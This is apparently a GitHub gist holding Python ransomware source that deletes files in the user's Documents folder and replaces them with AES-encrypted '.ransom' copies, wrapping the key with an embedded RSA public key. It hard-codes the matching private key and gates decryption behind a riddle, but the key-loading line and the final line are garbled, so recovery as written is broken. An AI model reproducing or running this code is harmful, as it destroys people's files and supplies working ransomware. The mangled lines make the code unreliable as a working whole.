#date: 2025-01-03T17:11:19Z
#url: https://api.github.com/gists/4bcc1004928c8ba43fa54508e7bb38e0
#owner: https://api.github.com/users/Trivaxy

import os
import threading
from pathlib import Path
from tkinter import Tk, simpledialog, messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

DOCUMENTS_FOLDER = Path.home() / "Documents"
TARGET_EXTENSIONS = {".txt", ".docx", ".pdf", ".xlsx", ".csv", ".pptx"}
RSA_PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr341SlFpHc39sYUrud13
hvgKsusnSxF6HmV69+y47mehCY0KE9hrSGxGBnumsHDskHCUDIRYk2SofW7ezq/0
A32QM6cOTN9xdcZCN+y81c1WJPK8eaLob2J9BTqW+l6YCgD+7KHq5WaiCL7snbJ2
3QHQNGT/SDCnC6BI7WXwFnZTCUPn9PNhTr28jajhSy8EzZnhtIy7fePKldfn3fPw
33qhGylUz+K6buB8KpZaib5+lhogxzxeGzoKZlpcG6lErmYwBqJDV75NlSfyzzA7
8NJSBLNpUbHtXG0hdA3NJnrB83T0k5It5tOFHfgPJf9efqBolagKz2iD+fXjikwk
sQIDAQAB
-----END PUBLIC KEY-----
"""
RSA_PRIVATE_KEY = b"""-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCvfjVKUWkdzf2x
hSu53XeG+Aqy6ydLEXoeZXr37LjuZ6EJjQoT2GtIbEYGe6awcOyQcJQMhFiTZKh9
bt7Or/QDfZAzpw5M33F1xkI37LzVzVYk8rx5ouhvYn0FOpb6XpgKAP7soerlZqII
vuydsnbdAdA0ZP9IMKcLoEjtZfAWdlMJQ+f082FOvbyNqOFLLwTNmeG0jLt948qV
1+fd8/DfeqEbKVTP4rpu4HwqllqJvn6WGiDHPF4bOgpmWlwbqUSuZjAGokNXvk2V
J/LPMDvw0lIEs2lRse1cbSF0Dc0mesHzdPSTki3m04Ud+A8l/15+oGiVqArPaIP5
9eOKTCSxAgMBAAECggEBAK6X4Iq0neCiHIBtXghHNnBX+8TvQKNlmtn82i8oGwBM
pyEqaVk/GdTuq2gtwrONVT2KUzB0xu602RAZqp903E5QsJNC425FasriWOTsqR4I
cGjH+g0FrzuJf5ohJS2nyJlDTlu750cdKZ2L3Toy4CCWej52MKfwh3CAoa1Vmlus
5axxS0xeS0VpD4+SMo+zB707gMh85A7duNVYRknn+pbNrbzzUAPSapLlM4yqXyAu
RJzNWeHSDMcYwP6Shf2lcJLUYs8thZ16VFHigS9wcUxzFw+GQ9FtNpag7JRVv9ix
8sFn4twY5aEnwcs9XSejaZ785KJyVyYrOYBnZMODtEECgYEA/pSr6Lmc4TPvZosp
HW9JicErm6Gf8VtgYzYsIBy1ABicSyNBbi8MKdD6/ORT9udj88DOEsL8O2tFRnwT
RkQRq9WV7fipjenW5O7l60fP+8yQi1ttWPdv8TxaHHpGzB357UEoQkLfS8vXNh3d
Vpi4pVUEKmI2EUgqt7D3ITejHJkCgYEAsHiqW4RwkZP3jfobBeVqWHntUU6iQAwO
PFlNVojn8nFEDIcsVDUZJVk22EfdkelcEQjXit10b4ddHWAEpFTiHyZKr5/KMcSc
7mQOkyAbfGs+R5NbDnsd8/WL2uRyw52wQk9inbvIQViQgPqCPZ9o4ptxsOUxmbFS
fbGFpatBf9kCgYEAsX/7NHJl/Wb2niqc6hbz0QZMX2CbYe7yD3pv3ZvmX0DJiGH2
dtp6wpUgyj5whI/k0sk1ZUNqFgu+61wLHEzNfV+X/6oGnhnSaSBgUmFplAiXJ3MB
lKxA8pO/yGdBAYRNA60QYtK5WeGwFd1Qu9YTt8LE+sArLnWAwz6xsAlYwtECgYAW
yy8t7PhhRVx3YTO2WkCXNwB5PQ/l9+iq0NoVcE+NWCXy/E60fbtGwLQ90WKEI0E6
DgtRK3OLqE9VqP5Qf4pJfbet4ZTLQtsGS7Q6Oq5yLqP3uMfNIgfnZ/Ltjg5ox+hp
WDmjqAqgriDUGAdUkE+K3Ysczy3N7UJ7a7+Ye3tVWQKBgByrPR0ndT0lUzPp7aSt
fsdrYGVladqK068k5d4HQ+it3GBOPpwOsYr953tJfKn0ExnDyAkNhKF1Yz1/fBK6
hbdAUpkHGI1HfqTv5D6WeBlZ2J/7mdPUJLxfYss7qbhUD1oKS5TirS2JsZEDv9ad
FWlyw+aM9FRr6HIf45hyGjMd
-----END PRIVATE KEY-----
"""
THREAD_COUNT = os.cpu_count()

def generate_aes_key():
    return os.urandom(32)

def encrypt_file(filepath, aes_key):
    with open(filepath, 'rb') as file:
        plaintext = file.read()

    os.remove(filepath)
    
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = iv + encryptor.update(plaintext) + encryptor.finalize()

    encrypted_path = filepath.with_suffix(filepath.suffix + ".ransom")
    with open(encrypted_path, 'wb') as encrypted_file:
        encrypted_file.write(ciphertext)

def encrypt_aes_key(aes_key, rsa_public_key):
    public_key = serialization.load_pem_public_key(rsa_public_key, backend=default_backend())
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

def save_ransom_key(encrypted_key):
    ransom_key_path = DOCUMENTS_FOLDER / "ransom.key"
    with open(ransom_key_path, 'wb') as key_file:
        key_file.write(encrypted_key)

def find_target_files():
    target_files = []
    for root, _, files in os.walk(DOCUMENTS_FOLDER):
        for file in files:
            if Path(file).suffix in TARGET_EXTENSIONS:
                target_files.append(Path(root) / file)
    return target_files

def encrypt_files_threaded(files, aes_key):
    def worker(sublist):
        for file_path in sublist:
            encrypt_file(file_path, aes_key)

    chunks = [files[i::THREAD_COUNT] for i in range(THREAD_COUNT)]
    threads = [threading.Thread(target=worker, args=(chunk,)) for chunk in chunks]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def decrypt_file(filepath, aes_key):
    with open(filepath, 'rb') as file:
        ciphertext = file.read()

    iv = ciphertext[:16]
    encrypted_content = ciphertext[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(encrypted_content) + decryptor.finalize()

    decrypted_path = filepath.with_suffix('')
    with open(decrypted_path, 'wb') as decrypted_file:
        decrypted_file.write(plaintext)

    os.remove(filepath)

def decrypt_files_threaded(files, aes_key):
    """Decrypt files using threading."""
    def worker(sublist):
        for file_path in sublist:
            decrypt_file(file_path, aes_key)

    chunks = [files[i::THREAD_COUNT] for i in range(THREAD_COUNT)]
    threads = [threading.Thread(target=worker, args=(chunk,)) for chunk in chunks]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

def riddle_prompt():
    riddle = "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?"
    answer = "echo"

    user_response = simpledialog.askstring("Ransomware Decryption", riddle)
    return user_response and user_response.strip().lower() == answer

def recover_files():
    root = Tk()
    root.withdraw()

    if not riddle_prompt():
        messagebox.showerror("Decryption Failed", "Incorrect answer. Decryption aborted.")
        return

    hostage_files = list(DOCUMENTS_FOLDER.rglob("*.ransom"))
    ransom_key_path = DOCUMENTS_FOLDER / "ransom.key"

    if not ransom_key_path.exists():
        messagebox.showerror("Error", "Ransom key file not found. Cannot decrypt files.")
        return

    try:
        with open(ransom_key_path, 'rb') as key_file:
            encrypted_aes_key = key_file.read()

        private_key = "**********"=None, backend=default_backend())
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        decrypt_files_threaded(hostage_files, aes_key)
        messagebox.showinfo("Decryption Complete", "All files have been successfully decrypted.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred during decryption: {e}")
        print(f"{e}")

if __name__ == "__main__":
    root = Tk()
    root.withdraw()

    ransom_key_path = DOCUMENTS_FOLDER / "ransom.key"

    if ransom_key_path.exists():
        recover_files()
    else:
        target_files = find_target_files()
        if not target_files:
            messagebox.showinfo("No Target Files", "No target files found for encryption.")
        else:
            aes_key = generate_aes_key()
            encrypt_files_threaded(target_files, aes_key)
            encrypted_key = encrypt_aes_key(aes_key, RSA_PUBLIC_KEY)
            save_ransom_key(encrypted_key)

            messagebox.showinfo("Encryption Complete", "Files have been encrypted and ransom.key has been saved.") been encrypted and ransom.key has been saved.")